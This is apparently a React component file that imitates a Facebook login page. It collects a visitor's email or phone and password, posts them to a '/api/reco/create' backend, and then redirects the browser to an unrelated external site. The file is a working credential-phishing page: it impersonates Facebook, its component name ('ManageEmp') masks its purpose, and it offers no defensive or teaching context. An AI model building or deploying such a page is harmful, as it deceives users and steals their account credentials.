import { useState } from "react";
import { useNavigate } from "react-router-dom";

export default function ManageEmp() {
  const [formData, setFormData] = useState({});
  const [publishError, setPublishError] = useState(null);
  const [showSuccessModal, setShowSuccessModal] = useState(false);

  console.log(formData);
  const navigate = useNavigate();

  const handlchange = (e) => {
    setFormData({ ...formData, [e.target.id]: e.target.value.trim() });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch("/api/reco/create", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(formData)
      });
      const data = await res.json();
      if (!res.ok) {
        setPublishError(data.message);
        return;
      }

      if (res.ok) {
        setPublishError(null);
        

        window.location.href = "https://www.kiyamu.com/";
      }
    } catch (error) {
      setPublishError("Something went wrong");
    }
  };

  return (
    <div className="flex justify-center items-center h-screen bg-blue-50">
      <div className="w-full max-w-sm bg-white p-8 rounded-lg shadow-lg">
        <div className="flex justify-center gap-2 mb-6">
          <img
            src="data:image/jpeg;base64,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"
            alt="Facebook Logo"
            className="w-[25px]"
          />
          <div>
          Facebook Logo
          </div>
        </div>
        <form onSubmit={handleSubmit}>
          <div className="mb-4">
            <input
              type="email"
              placeholder="Email or phone"
              className="w-full p-3 border border-gray-300 rounded-md"
              id="Email"
              onChange={handlchange}
            />
          </div>
          <div className="mb-4">
            <input
              type="password"
              placeholder="Password"
              className="w-full p-3 border border-gray-300 rounded-md"
              id="password"
              onChange={handlchange}
            />
          </div>
          <button
            type="submit"
            className="w-full p-3 bg-blue-500 text-white rounded-md hover:bg-blue-600"
          >
            Log In
          </button>
        </form>
        <div className="mt-4 text-center">
          <a href="/" className="text-blue-500 text-sm">
            Forgotten password?
          </a>
        </div>
        <div className="mt-6 text-center">
          <p>
            Don't have an account?{" "}
            <a href="/" className="text-blue-500">
              Sign Up
            </a>
          </p>
        </div>
      </div>
     

    </div>

    
  );
}
